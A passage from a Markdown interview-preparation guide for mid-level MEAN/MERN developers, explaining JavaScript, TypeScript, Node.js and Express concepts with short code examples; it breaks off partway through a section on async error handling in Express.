# MEAN & MERN Stack Interview Preparation — Detailed Guide

**Target: 4 Years of Experience | Mid-to-Senior Level**

This is the expanded version of the prep guide. Every answer is written to actually teach the concept — not just summarise it. Each question follows the same pattern: **the intuition**, **what's actually happening**, **a clear example**, and **why interviewers ask it**.

Read each answer slowly. The goal isn't to memorise — it's to understand well enough that you can explain it in your own words and handle follow-ups.

---

## Table of Contents
1. [JavaScript & TypeScript Core](#1-javascript--typescript-core)
2. [Node.js (Deep Dive)](#2-nodejs-deep-dive)
3. [Express.js](#3-expressjs)
4. [MongoDB](#4-mongodb)
5. [React (MERN)](#5-react-mern)
6. [Angular (MEAN)](#6-angular-mean)
7. [REST APIs & GraphQL](#7-rest-apis--graphql)
8. [Authentication & Security](#8-authentication--security)
9. [Performance & Scaling](#9-performance--scaling)
10. [System Design Scenarios](#10-system-design-scenarios)
11. [Coding Problems](#11-coding-problems)
12. [Behavioral Questions](#12-behavioral-questions)

---

## 1. JavaScript & TypeScript Core

### Q1. Explain the event loop. What's the difference between `process.nextTick`, `setImmediate`, and `setTimeout`?

**The intuition first.**

JavaScript is single-threaded — it has one call stack and can only do one thing at a time. But Node.js handles thousands of simultaneous network requests. How? Through the event loop.

Think of a busy restaurant with one waiter. The waiter doesn't stand around watching one customer eat — they take an order, hand it to the kitchen, take the next order, deliver food when ready, and so on. The waiter is always doing something, never blocked. The kitchen does the slow work in parallel. The event loop is that waiter.

**What's actually happening.**

The event loop runs in phases, in order, on every iteration ("tick"):

1. **Timers** — runs callbacks from `setTimeout` and `setInterval` that have expired.
2. **Pending callbacks** — internal I/O callbacks (rare to think about).
3. **Idle, prepare** — internal use only.
4. **Poll** — picks up new I/O events (network, file reads). This is where most of the work happens.
5. **Check** — runs callbacks from `setImmediate`.
6. **Close callbacks** — like `socket.on('close', ...)`.

Between **every** phase, Node drains two special queues called **microtasks**:
- `process.nextTick` callbacks
- Resolved Promise `.then` callbacks

Microtasks run before any further I/O or timer work, which is why they have the highest priority.

**The four scheduling functions.**

| Function | When it runs | Priority |
|---|---|---|
| `process.nextTick(cb)` | After the current operation, before any other phase | Highest |
| `Promise.resolve().then(cb)` | Microtask queue, after `nextTick` | Very high |
| `setImmediate(cb)` | Check phase (after I/O) | Lower |
| `setTimeout(cb, 0)` | Timers phase (with at least 1ms delay) | Similar to setImmediate, varies |

**Example.**

```js
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));
process.nextTick(() => console.log('nextTick'));
Promise.resolve().then(() => console.log('promise'));

console.log('sync');

// Output:
// sync         ← runs immediately
// nextTick     ← microtask, before any phase
// promise      ← microtask, right after nextTick
// timeout      ← timers phase
// immediate    ← check phase
```

The order of `timeout` and `immediate` can swap when called from the main module, but **inside an I/O callback, `setImmediate` always wins**:

```js
fs.readFile('file.txt', () => {
  setTimeout(() => console.log('timeout'), 0);
  setImmediate(() => console.log('immediate'));
});
// Output: immediate, then timeout — guaranteed
```

**Why interviewers ask this.**

If you understand the event loop, you understand why blocking it (with heavy synchronous work) breaks Node performance. It's the single most important concept for backend Node engineers.

---

### Q2. What's the difference between `==` and `===`? When would you ever use `==`?

**The intuition.**

`===` is the "strict" comparison — both type and value must match. `==` does **type coercion**: it tries to convert the operands to the same type before comparing. That coercion has weird rules and causes bugs.

**Examples of `==` weirdness:**

```js
0 == ''           // true — both coerce to 0
0 == '0'          // true
'' == '0'         // false — both strings, no coercion
null == undefined // true
null == 0         // false
'1' == true       // true — true → 1, '1' → 1
[] == false       // true — empty array coerces to ''
[] == ![]         // true (!) — left side is '', right side is false, both → 0
```

These are real bugs waiting to happen, so always use `===` by default.

**The one place `==` is useful.**

`value == null` is a concise way to check for both `null` and `undefined`:

```js
if (user == null) { ... }   // catches both null and undefined
// Equivalent to:
if (user === null || user === undefined) { ... }
```

This is acceptable and even idiomatic. Outside this case, stick to `===`.

---

### Q3. Explain closures with a real-world example.

**The intuition.**

A closure happens when a function "remembers" the variables from the scope where it was created, even after that outer scope has finished executing.

Imagine a backpack. When you create a function inside another function, the inner function packs into its backpack any variables it uses from the outer function. Even if you take the function and run it somewhere completely different, it still has those variables in its backpack.

**Example: a counter.**

```js
function makeCounter() {
  let count = 0;                    // lives in makeCounter's scope
  return function () {
    count++;                        // inner function still sees count
    return count;
  };
}

const counter = makeCounter();
counter();   // 1
counter();   // 2
counter();   // 3
```

Even though `makeCounter` finished long ago, `count` still exists because the returned function holds a reference to it. No one outside can touch `count` directly — it's effectively private state.

**Real-world use: a rate limiter.**

```js
function createRateLimiter(maxCalls, windowMs) {
  let calls = [];   // private — only this function can see/modify it
  return function () {
    const now = Date.now();
    calls = calls.filter(t => now - t < windowMs);
    if (calls.length >= maxCalls) return false;
    calls.push(now);
    return true;
  };
}

const limiter = createRateLimiter(5, 1000);
if (limiter()) doExpensiveCall();   // allowed up to 5 times per second
```

`calls` is encapsulated — there's no `limiter.calls` to mess with. This is how JavaScript created "private" data before classes had `#privateFields`.

**Where you'll see closures in production code.**

- Memoization caches (the cache lives in closure).
- Event handlers that "remember" the data they were attached with.
- Express middleware factories: `requireRole('admin')` returns a middleware that closes over `'admin'`.
- React hooks (`useState` returns a setter that closes over the slot).

---

### Q4. `var` vs `let` vs `const`. What's the temporal dead zone?

**The three keywords.**

- **`var`** — function-scoped (not block-scoped). Hoisted and initialised to `undefined`. Can be redeclared.
- **`let`** — block-scoped. Hoisted but **not** initialised. Can be reassigned.
- **`const`** — block-scoped. Hoisted but not initialised. **Cannot be reassigned** (but the object it points to can still be mutated).

**Function vs block scope — why it matters.**

```js
function example() {
  if (true) {
    var x = 1;
    let y = 2;
  }
  console.log(x);   // 1 — var leaks out of the if block!
  console.log(y);   // ReferenceError — let stays inside
}
```

`var` ignores `{}` blocks. It's only confined to the function. This is a common source of bugs, especially in loops:

```js
// var pitfall: all callbacks share the SAME i
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
// Prints: 3, 3, 3

// let creates a NEW i for each iteration
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
// Prints: 0, 1, 2
```

**The Temporal Dead Zone (TDZ).**

`let` and `const` are hoisted (the engine knows they exist before their declaration line), but they aren't initialised until the line where you declare them. The window between the start of the block and the declaration is the **temporal dead zone**. Accessing the variable in that window throws `ReferenceError`.

```js
console.log(a);   // ReferenceError — TDZ
let a = 5;

console.log(b);   // undefined — var is hoisted AND initialised
var b = 5;
```

**`const` mutability gotcha.**

`const` prevents reassignment of the binding, not mutation of the value:

```js
const user = { name: 'Alice' };
user.name = 'Bob';        // OK — mutating the object
user = { name: 'Bob' };   // TypeError — reassigning the binding
```

If you want a truly immutable object, use `Object.freeze()` or a library like Immer.

---

### Q5. Explain `this` in JavaScript. How does it differ in arrow functions?

**The core rule.**

`this` in a regular function depends on **how the function is called**, not where it's defined. There are five patterns:

1. **Method call** — `obj.fn()` → `this` is `obj`.
2. **Standalone call** — `fn()` → `this` is `undefined` in strict mode (or the global object in sloppy mode).
3. **Constructor call** — `new Fn()` → `this` is the brand-new instance.
4. **Explicit binding** — `fn.call(ctx)`, `fn.apply(ctx)`, `fn.bind(ctx)` → `this` is `ctx`.
5. **DOM event handler** — `this` is the element.

**Example: the lost `this` problem.**

```js
const user = {
  name: 'Alice',
  greet() {
    console.log(`Hi, ${this.name}`);
  }
};

user.greet();              // "Hi, Alice" — method call

const fn = user.greet;
fn();                      // "Hi, undefined" — standalone call, this is lost

setTimeout(user.greet, 0); // "Hi, undefined" — passed as a value, called standalone
```

When you pass `user.greet` as a callback, you're passing the function itself, not the call. By the time `setTimeout` calls it, the connection to `user` is gone.

**Arrow functions to the rescue.**

Arrow functions **don't have their own `this`**. They inherit `this` from the surrounding lexical scope at definition time. They also can't be `new`-ed.

```js
class Timer {
  constructor() {
    this.seconds = 0;
  }
  start() {
    // Arrow function — `this` is the Timer instance, not the global timer
    setInterval(() => {
      this.seconds++;
      console.log(this.seconds);
    }, 1000);
  }
}

new Timer().start();
```

If we'd used a regular function inside `setInterval`, `this` would have been `undefined` (or the Timer global), and `this.seconds++` would crash.

**When NOT to use arrow functions.**

- Object methods where you need `this` to refer to the object.
- Constructors (arrows can't be `new`-ed).
- Event handlers in vanilla DOM/jQuery code where you want `this` to be the element.

---

### Q6. Promises vs async/await. What problems does async/await solve?

**The progression: callbacks → promises → async/await.**

**Step 1: callbacks** — the original way to handle async. Leads to "callback hell" when you nest them:

```js
getUser(id, (err, user) => {
  if (err) return handle(err);
  getOrders(user.id, (err, orders) => {
    if (err) return handle(err);
    getInvoices(orders, (err, invoices) => {
      if (err) return handle(err);
      // ...four levels deep already
    });
  });
});
```

**Step 2: Promises** — flatten the nesting:

```js
getUser(id)
  .then(user => getOrders(user.id))
  .then(orders => getInvoices(orders))
  .then(invoices => render(invoices))
  .catch(handle);
```

Better, but you're still working with `.then` chains and the control flow is awkward (loops, conditionals, try/catch).

**Step 3: async/await** — makes async code look synchronous:

```js
async function loadInvoices(id) {
  try {
    const user = await getUser(id);
    const orders = await getOrders(user.id);
    const invoices = await getInvoices(orders);
    return invoices;
  } catch (err) {
    handle(err);
  }
}
```

Same code, way more readable. Loops, if-statements, and try/catch all work normally.

**What async/await actually is.**

It's syntactic sugar over promises. An `async` function always returns a promise. `await` pauses the function until the awaited promise settles, then resumes with the resolved value (or throws the rejection).

**The big gotcha: sequential vs parallel.**

`await` in a loop is sequential. If each fetch takes 1 second, ten fetches take 10 seconds:

```js
// SLOW — 10 seconds
for (const url of urls) {
  const r = await fetch(url);
  results.push(r);
}

// FAST — 1 second (all in parallel)
const results = await Promise.all(urls.map(url => fetch(url)));
```

Use `Promise.all` whenever the iterations don't depend on each other.

**Always handle errors.**

An unhandled rejection in an async function crashes Node 15+ by default. Either:
- Wrap `await` calls in `try/catch`, or
- Attach `.catch()` to the returned promise.

---

### Q7. What's the difference between `Promise.all`, `Promise.allSettled`, `Promise.race`, `Promise.any`?

These are four ways to combine multiple promises. The differences are in **when they settle** and **what they return**.

| Method | Resolves when | Rejects when | Result |
|---|---|---|---|
| `Promise.all` | ALL resolve | ANY rejects | Array of resolved values, or first rejection |
| `Promise.allSettled` | ALL settle (resolve or reject) | Never | Array of `{status, value/reason}` |
| `Promise.race` | First one settles | First one rejects | The first settlement |
| `Promise.any` | ANY resolves | ALL reject | First resolved value, or `AggregateError` |

**When to use each.**

- **`Promise.all`** — when you need everything to succeed. Loading user, settings, and notifications in parallel — if any fail, you want to bail.
- **`Promise.allSettled`** — when you want all results regardless. Notify 100 users; if 3 fail, log them but don't abort the whole batch.
- **`Promise.race`** — implementing timeouts. Race the real call against a timer that rejects after 5 seconds.
- **`Promise.any`** — fastest available wins. Querying three mirrors of a CDN; you don't care which responds first.

**Example: timeout pattern with `race`.**

```js
function withTimeout(promise, ms) {
  const timeout = new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Timeout')), ms)
  );
  return Promise.race([promise, timeout]);
}

const data = await withTimeout(fetch('/api/data'), 5000);
```

**Example: `allSettled` for batch processing.**

```js
const results = await Promise.allSettled(users.map(sendEmail));
const failed = results.filter(r => r.status === 'rejected');
console.log(`${failed.length} emails failed`);
```

---

### Q8. TypeScript: `interface` vs `type`. When to use which?

**The short answer.**

Both describe shapes. They overlap heavily, but each has features the other doesn't.

**`interface` features:**

- Can be **extended** with `extends`.
- Supports **declaration merging** — multiple `interface User { ... }` blocks combine.
- Better for object shapes that look like classes or public API contracts.

**`type` features:**

- Can describe **unions** (`string | number`), **intersections**, **tuples**, **primitives**.
- Supports **mapped types**, **conditional types**, **template literal types**.
- More flexible for advanced type manipulation.

**Examples.**

```ts
// interface — extending
interface Animal { name: string; }
interface Dog extends Animal { breed: string; }

// type — extending via intersection
type Animal = { name: string };
type Dog = Animal & { breed: string };

// type — unions (interface can't do this)
type Status = 'pending' | 'active' | 'banned';
type ID = string | number;

// type — mapped
type Readonly<T> = { readonly [K in keyof T]: T[K] };

// interface — declaration merging (useful for adding to library types)
interface Window {
  myCustomGlobal: string;   // adds to the existing Window interface
}
```

**My rule of thumb.**

- Use `interface` for object shapes you'll extend or that represent class/object contracts.
- Use `type` for unions, tuples, primitives, or anything computed.

In a typical codebase, you'll use both. Most teams pick a default and stay consistent — both choices work.

---

### Q9. What are TypeScript generics? Give a real example.

**The intuition.**

Generics let you write code that works with **any type**, while keeping type safety. Think of them as type-level parameters — the type is supplied later, when the function or class is used.

Without generics, you'd either lose type information (returning `any`) or write the same function over and over for each type.

**Without generics — bad.**

```ts
function firstString(arr: string[]): string { return arr[0]; }
function firstNumber(arr: number[]): number { return arr[0]; }
function firstUser(arr: User[]): User { return arr[0]; }
// One per type — yikes.
```

**With generics — good.**

```ts
function first<T>(arr: T[]): T {
  return arr[0];
}

const s = first(['a', 'b']);     // T inferred as string
const n = first([1, 2, 3]);      // T inferred as number
const u = first(users);          // T inferred as User
```

The `<T>` is a type parameter — TypeScript figures out what `T` is each time you call the function.

**Real example: a typed fetch wrapper.**

```ts
async function fetchJson<T>(url: string): Promise<T> {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json() as T;
}

interface User { id: string; name: string; email: string; }

const user = await fetchJson<User>('/api/me');
console.log(user.name);   // typed as string, autocomplete works
console.log(user.foo);    // ❌ compile error — User has no foo
```

**Constraining generics.**

Sometimes you need to require the type to have certain properties:

```ts
function getId<T extends { id: string }>(item: T): string {
  return item.id;
}

getId({ id: '123', name: 'A' });   // ✅
getId({ name: 'A' });              // ❌ — missing id
```

**Generic classes.**

```ts
class Cache<T> {
  private store = new Map<string, T>();
  get(key: string): T | undefined { return this.store.get(key); }
  set(key: string, value: T) { this.store.set(key, value); }
}

const userCache = new Cache<User>();
userCache.set('123', { id: '123', name: 'Alice', email: '...' });
```

---

### Q10. Explain prototypal inheritance.

**The intuition.**

Most languages have classical inheritance: classes inherit from classes, instances are made from classes. JavaScript is different. Every object has an internal link to **another object** called its prototype. When you ask for a property, JavaScript walks up that chain until it finds it, or hits `null`.

Think of it like a search through a stack of cards. You ask card 1 for "name." Card 1 doesn't have it, so it passes the question to card 2 (its prototype). Card 2 doesn't either, so it asks card 3. Eventually, someone has it — or the chain ends.

**Example.**

```js
const animal = { eats: true };
const dog = Object.create(animal);   // dog's prototype IS animal
dog.barks = true;

console.log(dog.barks);    // true — own property
console.log(dog.eats);     // true — found on prototype (animal)
console.log(dog.flies);    // undefined — not anywhere

// The chain
console.log(Object.getPrototypeOf(dog) === animal);   // true
```

**ES6 `class` syntax — sugar over prototypes.**

```js
class Animal {
  eat() { return 'munch'; }
}
class Dog extends Animal {
  bark() { return 'woof'; }
}

const d = new Dog();
d.bark();   // own (Dog.prototype.bark)
d.eat();    // inherited (Animal.prototype.eat)

// Under the hood:
// d.__proto__ === Dog.prototype
// Dog.prototype.__proto__ === Animal.prototype
// Animal.prototype.__proto__ === Object.prototype
```

**Why it matters.**

- All instances share methods on the prototype — memory-efficient. If you put methods on `this` inside the constructor, every instance gets a new copy.
- This is how `Array`, `String`, etc. work. `[].map` isn't on every array — it's on `Array.prototype`.
- Modifying built-in prototypes (`Array.prototype.myMethod = ...`) is "monkey patching" — discouraged because it affects all arrays.

---

## 2. Node.js (Deep Dive)

### Q11. Is Node.js single-threaded? How does it handle concurrency?

**The nuanced answer.**

Node's **JavaScript execution** is single-threaded. There's only one thread running your JS code at any moment. But the runtime (libuv, V8) uses multiple threads behind the scenes.

**Where the threads are:**

1. **Main thread** — runs your JavaScript and the event loop.
2. **libuv thread pool** (default size 4) — handles file system operations, DNS lookups, some crypto operations, and zlib compression. Configurable via `UV_THREADPOOL_SIZE`.
3. **OS-level async primitives** — used for network I/O. epoll on Linux, kqueue on macOS, IOCP on Windows. These don't need threads at all; the OS notifies Node when data is ready.

**So how does Node handle 10,000 concurrent connections?**

Network sockets don't take threads. The OS tracks them all. Node asks the OS "any of these ready?" and processes whatever is ready in a loop. Files do use threads (4 by default), but most of an API server's work is network.

**For CPU-bound work:**

The main thread is your bottleneck. If you do a heavy calculation, the event loop can't process other requests. Three solutions:
1. **`worker_threads`** — spawn additional JS threads in the same process.
2. **`cluster`** — fork multiple Node processes, each on its own core.
3. **External job queue** — push the work to a worker service via Redis/RabbitMQ.

---

### Q12. How would you handle CPU-intensive tasks in Node?

CPU-intensive means: image processing, video encoding, hashing/encryption, ML inference, complex calculations, parsing huge files.

**Three options, in order of complexity.**

**1. `worker_threads` — same process, parallel JS.**

```js
// main.js
const { Worker } = require('worker_threads');
const worker = new Worker('./heavy.js', { workerData: { input: bigData } });
worker.on('message', result => console.log(result));

// heavy.js
const { parentPort, workerData } = require('worker_threads');
const result = doHeavyComputation(workerData.input);
parentPort.postMessage(result);
```

Best for in-process CPU work where you want low overhead. Workers can share memory via `SharedArrayBuffer`.

**2. `cluster` — fork multiple processes.**

```js
const cluster = require('cluster');
const os = require('os');

if (cluster.isPrimary) {
  for (let i = 0; i < os.cpus().length; i++) cluster.fork();
} else {
  require('./app.js');   // each worker runs the full app
}
```

Best for scaling an HTTP server across CPU cores. In production, PM2 does this for you with auto-restart, log aggregation, and zero-downtime reload.

**3. External queue — separate service.**

```js
// API
await jobQueue.add('process-image', { imageId });
res.json({ status: 'queued' });

// Worker (separate process or even separate machine)
new Worker('process-image', async job => {
  await processImage(job.data.imageId);
});
```

Best for long jobs (seconds to minutes), expensive jobs (large memory), or jobs that can fail and retry. The API stays fast — it just enqueues. The worker can scale independently.

**Rule of thumb.**

- < 100ms work: do it inline.
- 100ms – 5s, CPU-bound: `worker_threads`.
- Scaling HTTP across cores: `cluster` (or PM2).
- Heavy / long / unreliable jobs: external queue (BullMQ on Redis is the standard).

---

### Q13. What is the difference between `cluster` and `worker_threads`?

| | cluster | worker_threads |
|---|---|---|
| **Isolation** | Separate processes (separate memory, separate V8 instances) | Threads within one process |
| **Memory** | Each process has its own heap (more total memory) | Shared process memory; can use `SharedArrayBuffer` |
| **Communication** | `process.send()` over IPC pipes — JSON serialised, slower | `MessagePort` — structured cloning, faster |
| **Startup cost** | Higher (full process boot) | Lower (just a thread) |
| **Use case** | Scaling stateless servers across cores | CPU-bound tasks within one app |
| **Crash isolation** | Strong — one worker dies, others survive | Weaker — a thread crash can affect the process |
| **Native modules** | Each process has its own copy | Shared, but most native modules aren't thread-safe |

**Mental model:**

- `cluster` is for **horizontal scaling on one machine** — make N copies of your server.
- `worker_threads` is for **parallel work within one server** — offload CPU.

Use both together: PM2 with cluster mode + worker threads for hot CPU code.

---

### Q14. How do streams work in Node? What are the four types?

**The intuition.**

Loading a 10GB log file into memory will crash your server. A stream lets you process data **in chunks** as it arrives — like a conveyor belt instead of a warehouse.

**The four types.**

1. **Readable** — a source of data. You read from it.
   - Examples: `fs.createReadStream('file.txt')`, `process.stdin`, an HTTP request body.
2. **Writable** — a destination. You write to it.
   - Examples: `fs.createWriteStream('file.txt')`, `process.stdout`, an HTTP response.
3. **Duplex** — both readable and writable. Two independent streams in one object.
   - Example: a TCP socket — you read from the peer and write to the peer.
4. **Transform** — a duplex stream where output is a transformation of input.
   - Examples: `zlib.createGzip()` (compresses), `crypto.createCipher()` (encrypts).

**Example: gzip a file with low memory.**

```js
const fs = require('fs');
const zlib = require('zlib');
const { pipeline } = require('stream/promises');

await pipeline(
  fs.createReadStream('input.txt'),    // readable
  zlib.createGzip(),                   // transform
  fs.createWriteStream('input.txt.gz') // writable
);
```

Memory usage stays roughly constant regardless of file size — typically 64KB at a time.

**Use `pipeline`, not `.pipe()`.**

The legacy `.pipe()` doesn't handle errors well — if any stream errors, the others may not be cleaned up. `pipeline` cleans up automatically and surfaces errors via promise rejection.

**Backpressure.**

If the writable can't keep up (e.g. slow disk, slow network), the readable will overwhelm it. Streams handle this automatically: `write()` returns `false` to signal "buffer is full, slow down." You should stop pushing until the `'drain'` event. `pipeline` and `.pipe()` handle backpressure for you. Manual stream code must respect it.

**Where you'll use streams.**

- File uploads / downloads.
- Compressing or transforming large files.
- Parsing huge CSV/JSON files line by line.
- Proxying HTTP responses (read from upstream, write to client).
- Database cursors that emit rows.

---

### Q15. What's `Buffer`? When do you use it?

**The intuition.**

JavaScript strings are encoded text. But sometimes you need raw bytes — files, network packets, image data, encryption. `Buffer` is Node's built-in type for fixed-size chunks of binary data.

**Quick facts.**

- A `Buffer` is allocated outside the V8 heap (it's not garbage-collected the usual way).
- You think of it as a fixed-length array of bytes (0–255).
- Many Node APIs return Buffers: `fs.readFile` (without encoding), HTTP request bodies, crypto.

**Example.**

```js
const buf = Buffer.from('hello', 'utf8');
console.log(buf);              // <Buffer 68 65 6c 6c 6f>
console.log(buf.length);       // 5
console.log(buf.toString());   // 'hello'
console.log(buf.toString('hex')); // '68656c6c6f'

// Allocate fixed size
const empty = Buffer.alloc(10);  // 10 zero bytes
```

**When to use it.**

- Handling file uploads as binary.
- Computing hashes (`crypto.createHash('sha256').update(buf)`).
- Sending raw network data.
- Image manipulation.

In modern code, `Uint8Array` does similar things and is cross-platform (works in browsers too). But Node APIs almost always give you Buffers.

---

### Q16. How does `require` work? `require` vs `import`.

**CommonJS (`require`) — the original Node module system.**

When you write `const lodash = require('lodash')`:

1. Node finds the file — checks `node_modules`, walks up directories.
2. The file's code is wrapped in a function: `(function(exports, require, module, __filename, __dirname) { ...your code... })`.
3. The function is executed.
4. Whatever you assigned to `module.exports` becomes the return value.
5. The result is **cached** in `require.cache`. Future calls return the cached value.

```js
// math.js
function add(a, b) { return a + b; }
module.exports = { add };

// app.js
const { add } = require('./math');
console.log(add(2, 3));   // 5
```

Key properties:
- **Synchronous** — blocks until the file is read and executed.
- **Dynamic** — you can `require` conditionally inside a function.
- **Cached** — same module is loaded once per process.

**ES Modules (`import`) — the modern standard.**

```js
// math.mjs (or math.js with "type": "module")
export function add(a, b) { return a + b; }

// app.mjs
import { add } from './math.mjs';
```

Key properties:
- **Static** — imports are hoisted; analysed before execution.
- **Async under the hood** — supports top-level `await`.
- **Tree-shakable** — bundlers can remove unused exports.
- **Strict mode by default**.

**Mixing them.**

You generally can't mix freely. To use ESM from CJS, use dynamic `import()` (returns a promise):
```js
const lib = await import('esm-only-package');
```

To use CJS from ESM, just `import` — but only the default export typically works:
```js
import lodash from 'lodash';   // CJS works as default
```

**Which should you use?**

For new projects in 2025+, ESM. Most libraries support both. Older projects on CJS are fine — there's no urgency to migrate. The Node ecosystem is in a long transition.

---

### Q17. How do you handle uncaught exceptions and unhandled rejections in production?

**The two events.**

```js
process.on('uncaughtException', (err) => {
  logger.fatal({ err }, 'uncaughtException');
  // The process is now in an UNDEFINED STATE.
  // Don't try to recover. Log, flush, exit.
  process.exit(1);
});

process.on('unhandledRejection', (reason) => {
  logger.error({ reason }, 'unhandledRejection');
  // In Node 15+, unhandled rejections also crash the process by default.
});
```

**The critical insight.**

After `uncaughtException`, your application's state cannot be trusted. Connections might be half-open, transactions partially committed, file handles leaked. Recovering inline is dangerous — you might cause more damage.

The right pattern:
1. Log the error (with all the context you can — stack, request ID).
2. Flush any buffered logs.
3. Exit the process.
4. Let your **process supervisor** restart it. PM2, systemd, Docker, Kubernetes — they all handle this.

**Why crashing fast is good.**

- A clean restart guarantees clean state.
- A failed health check signals the load balancer to stop sending traffic.
- A consistent crash pattern is easier to alert on than a zombie process.

**Don't catch what you don't understand.**

A common antipattern is wrapping everything in try/catch and continuing as if nothing happened. That hides bugs. Catch errors you can handle meaningfully (e.g., a failed external API call) and let the rest crash.

---

### Q18. What's `package.json` vs `package-lock.json`?

**`package.json` — the recipe.**

Lists dependencies and **version ranges** (not exact versions):

```json
{
  "dependencies": {
    "express": "^4.17.0",
    "mongoose": "~7.5.0"
  }
}
```

- `^4.17.0` means "4.17.0 or any later 4.x.x".
- `~7.5.0` means "7.5.0 or any later 7.5.x".
- Without a prefix, exact version.

**`package-lock.json` — the snapshot.**

Records the **exact** version of every dependency and sub-dependency that was installed. Looks like a tree of every package, version, integrity hash, and source URL.

**Why both?**

- `package.json` is human-friendly and declares intent ("I want any compatible Express 4").
- `package-lock.json` is machine-precise and ensures reproducibility ("everyone gets exactly Express 4.18.2").

Without the lockfile, two developers running `npm install` on different days might get different versions, leading to "works on my machine" bugs.

**Always commit `package-lock.json`.**

For libraries, some projects don't commit it (they want consumers to resolve fresh). For applications, always commit.

**`npm ci` vs `npm install`.**

In CI, use `npm ci`:
- Installs strictly from the lockfile (errors if out of sync).
- Wipes `node_modules` first.
- Faster and more deterministic than `npm install`.

`npm install` may update the lockfile based on `package.json` ranges, which is what you want during development but not in CI.

---

### Q19. How would you debug a memory leak in a Node app?

**Step 1: Confirm there is a leak.**

A leak means memory grows unbounded over time, not just that memory usage is high. Plot RSS (Resident Set Size) over hours or days.

```js
setInterval(() => {
  const m = process.memoryUsage();
  console.log({
    rss: (m.rss / 1e6).toFixed(1) + ' MB',
    heapUsed: (m.heapUsed / 1e6).toFixed(1) + ' MB',
  });
}, 30_000);
```

If memory grows monotonically with traffic and never recovers after load drops, you have a leak.

**Step 2: Take heap snapshots.**

```bash
node --inspect server.js
# Open chrome://inspect in Chrome → "Take heap snapshot"
```

Take one at startup, run load for a while, take another. Compare them in DevTools — sort by "Delta" or "Retained Size."

Or use the `heapdump` package programmatically:
```js
const heapdump = require('heapdump');
heapdump.writeSnapshot('./heap-' + Date.now() + '.heapsnapshot');
```

**Step 3: Find the culprit.**

Look for object types with growing counts. Common causes:

| Cause | What to look for |
|---|---|
| Unbounded cache | A Map or object growing forever |
| Event listeners not removed | "MaxListenersExceededWarning" in logs |
| Closures holding references | Large objects in callback arguments |
| Global arrays | `global.X.push(...)` somewhere |
| Promise chains retaining data | Long-lived promises holding response bodies |
| Timers not cleared | `setInterval` callbacks referencing big data |

**Step 4: Fix.**

- Bound caches with `lru-cache`.
- `removeListener` (or use `once`).
- Use `WeakMap` / `WeakRef` for caches keyed by object identity.
- Avoid global state; if needed, clear it periodically.

**Tools that help in production.**

- `clinic.js` (`clinic doctor`, `clinic heap`) — pre-baked workflows.
- APMs like Datadog, New Relic — track memory over time, alert on leaks.
- `node --inspect` attached to a production replica (carefully).

---

## 3. Express.js

### Q20. What is middleware? Walk me through the request lifecycle.

**The intuition.**

A middleware is a function that sits in the request/response pipeline. Each request flows through a chain of middleware functions, each of which can read/modify the request, send a response, or pass control to the next.

Think of a factory assembly line: each station does one job (logging, parsing JSON, checking auth, validating input, hitting the database) and hands the product to the next.

**The signature.**

```js
function middleware(req, res, next) {
  // do something with req/res
  next();           // pass control to the next middleware
  // OR: res.send(...)   // end here, don't call next
  // OR: next(err)       // jump to error-handling middleware
}
```

**The lifecycle of a request.**

```
incoming HTTP request
  ↓
app-level middleware  (helmet, cors, body parser, logger, ...)
  ↓
router-level middleware
  ↓
route-specific middleware  (authenticate, validateInput, ...)
  ↓
route handler  (the actual business logic)
  ↓
response sent
```

If any middleware calls `next(err)`, Express skips ahead to the **error-handling middleware** (signature `(err, req, res, next)` — four args).

**Example.**

```js
const express = require('express');
const app = express();

// 1. Logger — runs on every request
app.use((req, res, next) => {
  console.log(`${req.method} ${req.path}`);
  next();
});

// 2. JSON body parser
app.use(express.json());

// 3. Route-specific auth middleware
function requireAuth(req, res, next) {
  if (!req.headers.authorization) return res.status(401).send('Unauthorized');
  next();
}

// 4. Route handler
app.get('/profile', requireAuth, (req, res) => {
  res.json({ name: 'Alice' });
});

// 5. Error handler — must be LAST, must have 4 args
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Server error' });
});

app.listen(3000);
```

**Order matters.**

`app.use()` registers middleware in order. If `express.json()` is after your route, the route won't have a parsed body.

---

### Q21. How do you structure a production Express app?

**A layered structure that scales:**

```
src/
├── config/             # env loading, db connection setup
│   ├── env.js
│   └── db.js
├── routes/             # Express routers — only HTTP routing
│   ├── users.routes.js
│   └── orders.routes.js
├── controllers/        # HTTP layer — parse req, call service, format res
│   ├── users.controller.js
│   └── orders.controller.js
├── services/           # business logic, framework-agnostic
│   ├── users.service.js
│   └── orders.service.js
├── models/             # mongoose schemas / DB models
│   ├── user.model.js
│   └── order.model.js
├── middlewares/        # auth, validation, rate limit, error handler
│   ├── auth.js
│   └── errorHandler.js
├── utils/              # helpers, no business logic
├── app.js              # builds and exports the Express app
└── server.js           # ONLY this calls app.listen()
```

**The split between `app.js` and `server.js`.**

```js
// app.js
const express = require('express');
const app = express();
// ... middleware, routes, error handlers
module.exports = app;

// server.js
const app = require('./app');
const { connectDB } = require('./config/db');

(async () => {
  await connectDB();
  app.listen(process.env.PORT, () => console.log('listening'));
})();
```

Why split? In tests, you import `app` and pass it to Supertest without binding a real port:

```js
const request = require('supertest');
const app = require('../src/app');
const res = await request(app).get('/users').expect(200);
```

**Why layers?**

- **Routes** know about HTTP. **Services** don't.
- **Controllers** translate HTTP → service calls → HTTP. They're thin.
- **Services** have the business logic. They're testable without HTTP.
- **Models** know about the database.

If tomorrow you switch from Express to Fastify, only routes and controllers change. Services stay the same.

---

### Q22. How do you handle errors centrally in Express?

**A single error-handling middleware at the end of the chain.**

```js
// errorHandler.js
function errorHandler(err, req, res, next) {
  const status = err.statusCode || 500;
  
  // log every error with context
  logger.error({
    err,
    method: req.method,
    path: req.path,
    requestId: req.id,
    userId: req.user?.id,
  }, 'request failed');
  
  // don't leak internals in 5xx responses
  const message = status >= 500 ? 'Internal server error' : err.message;
  
  res.status(status).json({
    error: { code: err.code || 'ERR', message }
  });
}

module.exports = errorHandler;

// app.js
app.use(errorHandler);   // MUST be last
```

**The async wrapper problem.**

In Express 4, throwing inside an async route handler does NOT automatically reach the error middleware. The promise rejects unhandled.

```js
// BROKEN in Express 4
app.get('/users', async (req, res) => {
  const users = await db.find();   // if this throws, server crashes
  res.json(users);
});
```

**Fix: wrap async handlers.**
